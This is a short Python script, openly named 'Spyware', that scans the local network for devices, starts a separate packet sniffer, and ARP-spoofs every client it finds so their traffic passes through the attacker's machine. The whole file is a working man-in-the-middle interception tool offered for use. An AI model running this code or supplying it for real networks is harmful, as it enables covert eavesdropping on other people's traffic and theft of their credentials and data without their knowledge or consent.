from scapy.all import *
import network_scanner
import arp_spoof
from subprocess import *


class Spyware:
    def get_client_list(self):
        ip_target = net_scan_obj.get_arguments()
        client_list = net_scan_obj.scan_dev(ip_target.target)
        if len(client_list) == 0:
            print("[-] OOPS!! NO CLIENTS FOUND ")
            exit()
        return client_list

    def get_client_ip_list(self, client_list):
        client_ip_list = []
        for element in client_list:
            if str(element) != str(conf.route.route("0.0.0.0")[2]):
                client_ip_list.append(element["ip"])
        total_clients = len(client_ip_list)
        print("[+] Client List [" + str(total_clients) + "]" + "\n" + str(client_ip_list))
        return client_ip_list

    def get_interface(self):
        interface = conf.iface
        if not interface:
            print("[-] PLEASE PROVIDE AN INTERFACE [-i INTERFACE]")
        return interface

    def execute_spy_arp(self):
        client_ip_list =self.get_client_ip_list(self.get_client_list())
        interface = self.get_interface()
        Popen(["python3", "packet_sniffer.py", "-i", interface])
        print("[+] ARP SPOOF ACTIVATED !")
        print("[+] SPYWARE SNIFFING DATA :)")
        arp_spoof_obj.execute_arp_spoof(client_ip_list)


net_scan_obj = network_scanner.NetworkScanner()
arp_spoof_obj = arp_spoof.ArpSpoof()
spyware_obj = Spyware()
spyware_obj.execute_spy_arp()


